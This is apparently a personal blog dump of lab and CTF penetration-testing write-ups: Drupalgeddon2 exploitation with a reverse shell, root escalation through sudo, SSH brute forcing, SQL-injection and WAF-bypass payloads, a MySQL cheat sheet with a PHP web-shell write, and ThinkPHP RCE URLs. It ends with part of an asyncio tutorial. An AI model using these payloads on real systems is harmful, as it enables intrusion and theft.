7.6后显示存在一个用户名爆破漏洞，但是用处应该不大，因为还需要密码；翻找了其他http服务相关的页面无可用信息（这里主要使用的是目录扫描）。 但是可以从nmap扫描信息中看到在9001端口运行了Drupal 7服务，之前做相关靶机学习时得知此服务存在exp，这里可以使用msfconsole框架进行搜索加载相关exp。这里有点问题，在做的时候因为用错了exp始终无法返回shell，后面参考了网络上相关文章，此处应该使用exploit/unix/webapp/drupal_drupalgeddon2。 漏洞利用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677msfconsole `:oDFo:` ./ymM0dayMmy/. -+dHJ5aGFyZGVyIQ==+- `:sm⏣~~Destroy.No.Data~~s:` -+h2~~Maintain.No.Persistence~~h+- `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:` ./etc/shadow.0days-Data&#x27;%20OR%201=1--.No.0MN8&#x27;/. -++SecKCoin++e.AMd` `.-://///+hbove.913.ElsMNh+- -~/.ssh/id_rsa.Des- `htN01UserWroteMe!- :dopeAW.No&lt;nano&gt;o :is:TЯiKC.sudo-.A: :we&#x27;re.all.alike&#x27;` The.PFYroy.No.D7: :PLACEDRINKHERE!: yxp_cmdshell.Ab0: :msf&gt;exploit -j. :Ns.BOB&amp;ALICEes7: :---srwxrwx:-.` `MS146.52.No.Per: :&lt;script&gt;.Ac816/ sENbove3101.404: :NT_AUTHORITY.Do `T:/shSYSTEM-.N: :09.14.2011.raid /STFU|wall.No.Pr: :hevnsntSurb025N. dNVRGOING2GIVUUP: :#OUTHOUSE- -s: /corykennedyData: :$nmap -oS SSo.6178306Ence: :Awsm.da: /shMTl#beats3o.No.: :Ring0: `dDestRoyREXKC3ta/M: :23d: sSETEC.ASTRONOMYist: /- /yo- .ence.N:()&#123; :|: &amp; &#125;;: `:Shall.We.Play.A.Game?tron/ ```-ooy.if1ghtf0r+ehUser5` ..th3.H1V3.U2VjRFNN.jMh+.` `MjM~~WE.ARE.se~~MMjMs +~KANSAS.CITY&#x27;s~-` J~HAKCERS~./.` .esc:wq!:` +++ATH` ` =[ metasploit v6.0.30-dev ]+ -- --=[ 2099 exploits - 1129 auxiliary - 357 post ]+ -- --=[ 592 payloads - 45 encoders - 10 nops ]+ -- --=[ 7 evasion ]Metasploit tip: When in a module, use back to go back to the top level promptmsf6 &gt; search DrupalMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/gather/drupal_openid_xxe 2012-10-17 normal Yes Drupal OpenID External Entity Injection 1 auxiliary/scanner/http/drupal_views_user_enum 2010-07-02 normal Yes Drupal Views Module Users Enumeration 2 exploit/multi/http/drupal_drupageddon 2014-10-15 excellent No Drupal HTTP Parameter Key/Value SQL Injection 3 exploit/unix/webapp/drupal_coder_exec 2016-07-13 excellent Yes Drupal CODER Module Remote Command Execution 4 exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28 excellent Yes Drupal Drupalgeddon 2 Forms API Property Injection 5 exploit/unix/webapp/drupal_restws_exec 2016-07-13 excellent Yes Drupal RESTWS Module Remote PHP Code Execution 6 exploit/unix/webapp/drupal_restws_unserialize 2019-02-20 normal Yes Drupal RESTful Web Services unserialize() RCE 7 exploit/unix/webapp/php_xmlrpc_eval 2005-06-29 excellent Yes PHP XML-RPC Arbitrary Code ExecutionInteract with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_evalmsf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2[*] No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.109.145rhosts =&gt; 192.168.109.145msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 9001rport =&gt; 9001msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit [*] Started reverse TCP handler on 192.168.109.140:4444 [*] Executing automatic check (disable AutoCheck to override)[+] The target is vulnerable.[*] Sending stage (39282 bytes) to 192.168.109.145[*] Meterpreter session 1 opened (192.168.109.140:4444 -&gt; 192.168.109.145:45078) at 2021-07-27 13:18:40 -0400 利用成功，这里可在misc目录下找到应该存放用户名密码的文件（tyrell.pass），此处也参考了网络上的文章，应该在翻文件时不仔细。。。 读取密码文件 123cat tyrell.passUsername: tyrellPassword: mR_R0bo7_i5_R3@!_ 得到用户名密码后可使用ssh进行连接连接成功后需要提权，此处提权依然使用sudo进行提权 提权 123456sudo -lMatching Defaults entries for tyrell on vuln_cms: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser tyrell may run the following commands on vuln_cms: (root) NOPASSWD: /bin/journalctl 可以看到journalctl运行时不需要验证密码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849sudo journalctl -- Logs begin at Fri 2021-05-28 12:16:41 UTC, end at Tue 2021-07-27 17:31:18 UTC. --May 28 12:16:41 vuln_cms kernel: Linux version 4.15.0-143-generic (buildd@lcy01-amd64-001) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #147-Ubuntu SMP Wed Apr 14 16:10:11 UTMay 28 12:16:41 vuln_cms kernel: Command line: BOOT_IMAGE=/vmlinuz-4.15.0-143-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro maybe-ubiquityMay 28 12:16:41 vuln_cms kernel: KERNEL supported cpus:May 28 12:16:41 vuln_cms kernel: Intel GenuineIntelMay 28 12:16:41 vuln_cms kernel: AMD AuthenticAMDMay 28 12:16:41 vuln_cms kernel: Centaur CentaurHaulsMay 28 12:16:41 vuln_cms kernel: [Firmware Bug]: TSC doesn&#x27;t count with P0 frequency!May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x001: &#x27;x87 floating point registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x002: &#x27;SSE registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x004: &#x27;AVX registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: xstate_offset[2]: 576, xstate_sizes[2]: 256May 28 12:16:41 vuln_cms kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using &#x27;standard&#x27; format.May 28 12:16:41 vuln_cms kernel: e820: BIOS-provided physical RAM map:May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usableMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000100000-0x000000007ffeffff] usableMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000007fff0000-0x000000007fffffff] ACPI dataMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reservedMay 28 12:16:41 vuln_cms kernel: NX (Execute Disable) protection: activeMay 28 12:16:41 vuln_cms kernel: SMBIOS 2.5 present.May 28 12:16:41 vuln_cms kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006May 28 12:16:41 vuln_cms kernel: Hypervisor detected: KVMMay 28 12:16:41 vuln_cms kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&gt; reservedMay 28 12:16:41 vuln_cms kernel: e820: remove [mem 0x000a0000-0x000fffff] usableMay 28 12:16:41 vuln_cms kernel: e820: last_pfn = 0x7fff0 max_arch_pfn = 0x400000000May 28 12:16:41 vuln_cms kernel: MTRR default type: uncachableMay 28 12:16:41 vuln_cms kernel: MTRR variable ranges disabled:May 28 12:16:41 vuln_cms kernel: MTRR: DisabledMay 28 12:16:41 vuln_cms kernel: x86/PAT: MTRRs disabled, skipping PAT initialization too.May 28 12:16:41 vuln_cms kernel: CPU MTRRs all blank - virtualized system.May 28 12:16:41 vuln_cms kernel: x86/PAT: Configuration [0-7]: WB WT UC- UC WB WT UC- UC May 28 12:16:41 vuln_cms kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff]May 28 12:16:41 vuln_cms kernel: Scanning 1 areas for low memory corruptionMay 28 12:16:41 vuln_cms kernel: RAMDISK: [mem 0x30ec5000-0x34759fff]May 28 12:16:41 vuln_cms kernel: ACPI: Early table checksum verification disabledMay 28 12:16:41 vuln_cms kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX )May 28 12:16:41 vuln_cms kernel: ACPI: XSDT 0x000000007FFF0030 00003C (v01 VBOX VBOXXSDT 00000001 ASL 00000061)May 28 12:16:41 vuln_cms kernel: ACPI: FACP 0x000000007FFF00F0 0000F4 (v04 VBOX VBOXFACP 00000001 ASL 00000061)May 28 12:16:41 vuln_cms kernel: ACPI: DSDT 0x000000007FFF0470 002325 (v02 VBOX VBOXBIOS 00000002 INTL 20100528)May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040!/bin/sh# iduid=0(root) gid=0(root) groups=0(root) 程序运行后，输入!/bin/sh可提升至root权限读取flag 123456789101112# cd /home/ # lselliot ghost tyrell# cd elliot# cat user.txt9046628504775551# cd /root/# lsroot.txt# cat root.txt4359537020406305# done","categories":[],"tags":[],"author":"Dokey_"},{"title":"Vulnhub-Hackathon2","slug":"Vulnhub-Hackathon2","date":"2021-07-24T06:06:59.000Z","updated":"2023-03-25T14:35:06.442Z","comments":true,"path":"16564.html","link":"","permalink":"http://example.com/16564.html","excerpt":"","text":"记录打靶机（Hackathon2）的过程信息探测主机发现这里使用的是arp-scan进行扫描，因为在使用netdiscover无法成功探测到网段下存活主机，不知道是不是命令使用不正确，后续研究一下。。。 123456789101112sudo arp-scan 192.168.109.1/24 Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140WARNING: host part of 192.168.109.1/24 is non-zeroStarting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.144 00:0c:29:28:21:61 VMware, Inc.192.168.109.254 00:50:56:f2:84:70 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.934 seconds (132.37 hosts/sec). 4 responded 经arp-scan探测后发现存在192.168.109.144这个IP地址，对此IP地址进行端口扫描，一般会存在80端口 端口扫描 1234567891011121314151617181920212223242526272829303132333435363738nmap -sC -sV -p- 192.168.109.144 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 23:33 EDTNmap scan report for 192.168.109.144Host is up (0.00020s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 1000 1000 47 Jun 18 17:32 flag1.txt|_-rw-r--r-- 1 1000 1000 849 Jun 19 05:11 word.dir| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.109.140| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_*/|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: hackathon27223/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 70:4a:a9:69:c2:d1:68:23:86:bd:85:83:31:ca:80:0c (RSA)| 256 a6:9e:a4:18:ad:a4:2b:7e:ea:f8:5e:63:29:6e:4f:24 (ECDSA)|_ 256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds nmap扫描后发现存在21（ftp）、80（Apache-httpd）、7223（ssh）三个端口，针对这三个端口有必要进行以下信息收集： ftp（21）端口： 尝试匿名用户登录（anonymous&#x2F;anonymous）✔ 在漏洞数据库搜索相关ftp（vsftpd 3.0.3）版本漏洞 ✗ http（80）端口： 可进行目录扫描，爆破出隐藏的目录以及页面 ✔ 查看已发现页面的源码，对index.html源码进行查看，无有用信息，因为是靶机，通常页面或者隐藏页面中源码会有一些有用的信息 ✔ ssh（7223）端口 在漏洞数据库搜索相关ssh（OpenSSH 8.2p1）版本漏洞 ✗ 使用hydra进行爆破，此处需收集用户名、密码 ✔ 使用anonymous&#x2F;anonymous登录ftp 12345678910111213141516ftp&gt; open 192.168.109.144Connected to 192.168.109.144.220 (vsFTPd 3.0.3)Name (192.168.109.144:kali): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 1000 1000 47 Jun 18 17:32 flag1.txt-rw-r--r-- 1 1000 1000 849 Jun 19 05:11 word.dir226 Directory send OK.ftp&gt; 匿名登录成功后可以看到flag1.txt和word.dir两个文件，猜测word.dir为一个字典文件，看了内容大概率是一个密码字典文件，如果使用其来爆破ssh用户名密码的话，此处还需要用户名， 因为本次靶机使用的ssh版本不存在用户名枚举漏洞，故猜测在80端口页面上可能存在用户名。 进行目录扫描这里有点问题：在使用dirb进行目录扫描时会发现除了几个通用的页面之外无其他有用信息Tips：可以使用word.dic为字典文件进行目录扫描 123456789101112131415161718192021dirb http://192.168.109.144/ word.dir -----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sat Jul 24 01:52:28 2021URL_BASE: http://192.168.109.144/WORDLIST_FILES: word.dir-----------------GENERATED WORDS: 109 ---- Scanning URL: http://192.168.109.144/ ----+ http://192.168.109.144/happy (CODE:200|SIZE:110) -----------------END_TIME: Sat Jul 24 01:52:28 2021DOWNLOADED: 109 - FOUND: 1 经扫描后发现存在happy页面，访问后在源码上可发现暴露了一个用户名 爆破ssh整理一下信息，现在在80端口下的happy页面发现用户名，在ftp上发现word.dic字典文件，可以尝试爆破ssh，进一步获取权限 12345678910111213hydra -l hackathonll -P word.dir -f -t 20 ssh://192.168.109.144 -s 7223 Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-24 00:16:41[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 20 tasks per 1 server, overall 20 tasks, 110 login tries (l:1/p:110), ~6 tries per task[DATA] attacking ssh://192.168.109.144:7223/[7223][ssh] host: 192.168.109.144 login: hackathonll password: Ti@gO[STATUS] attack finished for 192.168.109.144 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-24 00:16:58 hydra已经爆破出密码：Ti@gO 连接ssh使用已爆破的用户名、密码进行ssh连接至靶机 1234567891011121314151617181920212223242526272829ssh hackathonll@192.168.109.144 -p 7223 hackathonll@192.168.109.144&#x27;s password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 24 Jul 2021 07:38:22 AM UTC System load: 0.01 Processes: 221 Usage of /: 24.2% of 18.57GB Users logged in: 0 Memory usage: 20% IPv4 address for ens33: 192.168.109.144 Swap usage: 0%67 updates can be installed immediately.0 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Sat Jul 24 04:18:07 2021 from 192.168.109.140$ iduid=1001(hackathonll) gid=1001(hackathonll) groups=1001(hackathonll)$ 连接成功，但是此时的用户为hackathonll，因此需要进行提权 提权使用sudo -l查看是否可使用sudo进行提权，发现vim可以不验证密码具备root权限 12345678sudo -lMatching Defaults entries for hackathonll on hackathon: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser hackathonll may run the following commands on hackathon: (root) NOPASSWD: /usr/bin/vim 上网查过后发现可直接使用vim进行提权，进入vim编辑界面时输入!bash可直接获取root权限可参考：https://blog.csdn.net/qq_39991837/article/details/118119954 1234567891011sudo vimroot@hackathon:/home/hackathonll# iduid=0(root) gid=0(root) groups=0(root)root@hackathon:/home/hackathonll# lsroot@hackathon:/home/hackathonll# cdroot@hackathon:~# lsflag2.txt snaproot@hackathon:~# cat flag2.txt ₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc694&#125;root@hackathon:~# 至此，Hackathon2靶机渗透完成。。。done","categories":[],"tags":[],"author":"Dokey_"},{"title":"zixem SQL challenges","slug":"zixem-challenges","date":"2021-07-22T08:43:09.000Z","updated":"2023-03-25T14:35:06.472Z","comments":true,"path":"19459.html","link":"","permalink":"http://example.com/19459.html","excerpt":"","text":"Level 1简单的一关，常规的联合查询注入(数字型)。 ?id=1 and 1=2 union select 1,concat(user(),version),3--+ Level 2同Level 1简单，字符型注入，闭合单引号即可。 ?showprofile=4&#39; and 1=2 union select 1,user(),version(),4--+ Level 3常规字符型注入，使用--+闭合单引号号即可，在使用union进行注入时，union会变成uni，此时需要使用unionon。 ?item=3&#39; and 1=2 unionon select 1,user(),version(),4--+ Level 4同Level 3，字符型注入，闭合单引号，注入语句无法使用-使其报错，可使用and 1=2。 ?ebookid=7&#39; and 1=2 union select 1,2,user(),version(),5--+ Level 5需要爆破，待… Level 6 and 1=2 union select (select id from teachers limit 1,1),(select teacher from teachers limit 1,1),(select teacher_age from teachers limit 1,1),(select price from teachers limit 1,1)-- Level 7这一关有点意思，注入好久没发现问题在哪，网上搜索后发现数据提交之后页面源代码中有个隐藏的value。 图中value的值就是注入点，后面都是常规注入操作 ?id=1 AND 1=2 UNION SELECT 1,user(),3--+ Level 8这一关会对%20进行过滤（初步判断）以及会对select进行检测，双写可绕过，数字型注入，可使用%09、%0d进行绕过，后面就是常规的注入操作。 ?id=1%09and%091=2%09union%09seselectlect%09user(),version(),3--%09- Level 9这一关需要读取/etc/passwd文件，经测试知道load_file()被禁止。不过在插入SQL注入语句(字符型注入)时会报以下错误： 根据报错提示可以在1处进行读取 ?id=1&#39; and 1=2 union select &#39;../etc/passwd&#39;,2-- - Level 10这一关x为注入点，但是参数是经过编码的，刚开始以为是base64 encode + url encode,解码后发现并没有那么简单，经过看别人的blog后了解到是uuencode，解码后参数显示为1。将SQL注入语句经过编码后可正常执行。 将SQL注入语句编码后即可 1234567891011121 and 1=2 union select 1,concat(user(),version())-- -经过uuencode加密后得到M,2!A;F0@,3TR(&#x27;5N:6]N(&#x27;-E;&amp;5C=&quot;`Q+&amp;-O;F-A=&quot;AU&lt;V5R*&quot;DL=F5R&lt;VEO(;B@I*2TM(&quot;T``再使用base64进行编码得到TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA=最后使用url编码得到最终payloadTSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA%3D done 参考链接 https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4","categories":[],"tags":[],"author":"Dokey_"},{"title":"Bypass Mod_Security","slug":"Bypass-Mod-Security","date":"2021-07-21T07:45:17.000Z","updated":"2023-03-25T14:35:06.415Z","comments":true,"path":"14163.html","link":"","permalink":"http://example.com/14163.html","excerpt":"","text":"记bypass Mod_Security起因Google上搜索相关SQL注入，在测试中发现使用联合查询注入时会报错 `Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.`， 使用order by 猜解显示位时不会报错 经过懒得fuzz，直接Google搜索了相关bypass文章，文章中详细介绍了fuzz过程，直接修改payload 进行注入。 结果结果当然是ok的了，成功注出数据库名和版本信息，后面操作大同小异，溜溜球！ payload 1/*!12345UnIoN*//**/(/*!12345SEleCt*//**/ 1,2,3,4,5,6,7)--+ done 参考链接：https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad","categories":[],"tags":[],"author":"Dokey_"},{"title":"MYSQL备忘录","slug":"SQL备忘录","date":"2021-07-21T02:30:26.000Z","updated":"2023-03-25T14:35:06.435Z","comments":true,"path":"22293.html","link":"","permalink":"http://example.com/22293.html","excerpt":"","text":"列出可用的数据库 SHOW DATABASE; 切换到数据库 USE table_name 表 添加新表 CREATE TABLE logins (id INT, ...) 列出当前数据库中的可用表 SHOW TABLES; 显示表属性和列 DESCRIBE logins 将值添加到表 INSERT INTO table_name VALUES (value_1,...) 将值添加到表中的特定列 INSERT INTO table_name(colums2,...) VALUES(column2_value, ...) 更新表值 UPDATE table_name SET column1=newvalue1,...WHERE &lt;CONDITION&gt; 列 显示表格中的所有列 SELECT * FROM table_name 显示表格中的特定列 SELECT column1, column2 FROM table_name 删除表 DROP TABLE logins 添加新列 ALTER TABLE logins ADD newColumn INT 重命名列 ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn 更改列数据类型 ALTER TABLE logins MODIFY oldColumn DATE 删除列 ALTER TABLE logins DROP oldColumn 输出 按列排序 SELECT * FROM logins ORDER BY column_1 按列降序排序 SELECT * FROM logins ORDER BY column_1 DESC 按两列排序 SELECT * FROM logins ORDER BY column_1 DESC, id ASC 只显示前两个结果 SELECT * FROM logins LIMIT 2 只显示从索引2开始的前两个结果 SELECT * FROM logins LIMIT 1,2 列出满足条件的结果 SELECT * FROM table_name WHERE &lt;condition&gt; 列出名称与给定字符串相似的结果 SELECT * FROM logins WHERE username LIKE &#39;admin%&#39; MySQL运算符优先级 除法(&#x2F;)、乘法（*）和模数（%） 加法（+）和减法（-） 比较（&#x3D;,&gt;,&lt;,&lt;&#x3D;,&gt;&#x3D;,!&#x3D;,LIKE） 不是（！） 与（&amp;&amp;） 或（||） Payload身份验证绕过 基本身份认证绕过 admin&#39; or &#39;1&#39;=&#39;1 带注释的基本身份验证绕过 admin&#39;)-- - union injection 使用检测列数 order by &#39; order by 1-- - 使用联合注入检测列数 cn&#39; UNION select 1,2,3-- - 基本联合注入 cn&#39; UNION select 1,@@version,3,4-- - 4列联合注入 UNION select username, 2, 3, 4 from passwords-- - 数据库枚举 带查询输出的指纹 MySQL SELECT @@version 没有输出的指纹 MySQL SELECT SLEEP(5) 当前数据库名称 cn&#39; UNION select 1,database(),2,3-- - 列出所有数据库 cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 列出特定数据库中的所有表 cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- - 列出特定表中的所有列 cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- - 从另一个数据库中的表转储数据 cn&#39; UNION select 1, username, password, 4 from dev.credentials-- - 特权 查找当前用户 cn&#39; UNION SELECT 1,user(),3,4-- - 查找用户是否具有管理员权限 cn&#39; UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user=&quot;root&quot;-- - 查找是否所有用户权限 cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- - 查找可以通过 MySQL 访问的目录 cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- - 文件注入 读取本地文件 cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- - 将字符串写入本地文件 select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39; 将 web shell 写入基本 web 目录 cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -","categories":[],"tags":[],"author":"Dokey_"},{"title":"vulhub","slug":"vulhub","date":"2021-07-19T07:08:58.000Z","updated":"2023-03-25T14:35:06.467Z","comments":true,"path":"26813.html","link":"","permalink":"http://example.com/26813.html","excerpt":"","text":"vulhubThinkPHP 2.x 任意代码执行漏洞1访问http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D即可执行phpinfo() Thinkphp5 5.0.22&#x2F;5.1.29 Remote Code Execution Vulnerability1http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 ThinkPHP5 5.0.23 Remote Code Execution Vulnerability1234567891011POST /index.php?s=captcha HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id ThinkPHP5 SQL Injection Vulnerability &amp;&amp; Sensitive Information Disclosure Vulnerability1http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)1http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd","categories":[],"tags":[],"author":"Dokey_"},{"title":"异步协程-02","slug":"异步协程-02","date":"2021-07-01T11:14:26.000Z","updated":"2023-03-25T14:35:06.476Z","comments":true,"path":"60636.html","link":"","permalink":"http://example.com/60636.html","excerpt":"","text":"异步编程事件循环死循环，检测代码并执行某些代码 1234567891011任务列表 = [任务1，任务2，任务3...]while True: 可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有的任务，将&quot;可执行&quot;和&quot;已完成&quot;的任务返回 for 就绪任务 in 可执行的任务列表： 执行已就绪的任务 for 已完成的任务 in 已完成的任务列表： 再任务列表中移除 已完成任务 如果任务列表中的任务都已完成，则终止循环 快速上手协程函数，定义函数为async def 函数名协程对象，执行 协程函数() 得到的协程对象 123456import asyncioasync def func(): passresult = func() 注意：执行协程函数创建协程对象，函数内部代码不会执行如果想要运行协程函数内部代码，必须要将协程对象交给事件循环来处理 1234567891011import asyncioasync def func(): print(&quot;test&quot;) result = func()loop = asyncio.get_event_loop()loop.run_until_complete(result)# asyncio.run(result ) await关键字await + 可等待对象（协程对象、Future、Task对象）-&gt; IO等待一个协程函数中可以存在多个await示例： 1234567891011121314import asyncioasync def others(): print(&quot;start&quot;) await asyncio.sleep(2) print(&quot;end&quot;) return &quot;返回值&quot;async def func(): print(&quot;执行协程函数内部代码&quot;) response = await others() print(&quot;IO请求结束， 结果为：&quot; + response)asyncio.run(func()) 输出结果 12345执行协程函数内部代码start----------停顿end IO请求结束，结果为： 返回值 task对象Tasks用于并发调度协程，通过asyncio.create_task(协程对象)的方式创建Tak对象，这样可以让协程加入事件循环中等待被调度执行。除了使用asyncio.create_task()函数以外，还可以用低层级的loop.create_task()或ensure_future()函数，不建议手动实例化Task对象。 示例1 12345678910111213141516171819202122232425import asyncioasync def func(): print(1) await asyncio.sleep(2) print(2) return &quot;返回值&quot; async def main(): print(&quot;main 开始&quot;) # 创建Task对象，将当前执行func函数任务添加到事件循环中 task1 = asyncio.create_task(func()) # 创建Task对象，将当前执行func函数任务添加到事件循环中 task2 = asyncio.create_task(func()) print(&quot;main 结束&quot;) # 当执行某协程遇到IO操作时，会自动化切换执行其他任务 # 此处的await是等待相应的协程全都执行完毕并获取结果 ret1 = await task1 ret2 = await task2 asyncio.run(main()) 输出结果 12345678main 开始main 结束11---------sleep(2秒)22返回值 返回值 示例2 12345678910111213141516171819202122import asyncioasync def func(): print(1) await asyncio.sleep(2) print(2) return &quot;返回值&quot; async def main(): print(&quot;main 开始&quot;) task_list = [ asyncio.create_task(func(), name=&quot;task1&quot;) asyncio.create_task(func(), name=&quot;task2&quot;) ] print(&quot;main 结束&quot;) done, pending = await asyncio.wait(task_list) print(done) asyncio.run(main()) 输出结果 12345678main 开始main 结束11--------sleep(2秒)22&#123;&lt;Task finished name=&#x27;task1&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;, &lt;Task finished name=&#x27;task2&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;&#125; async Future对象Task对象继承Future，Task对象内部await结果的处理基于Future对象来的 concurrent.futures.Future对象使用线程池、进程池实现异步操作时用到的对象 异步迭代器略 异步上下文管理器此种对象通过定义__aenter__()和__aexit__()方法来对async_with语句中的环境进行控制 12345678910111213141516171819202122import 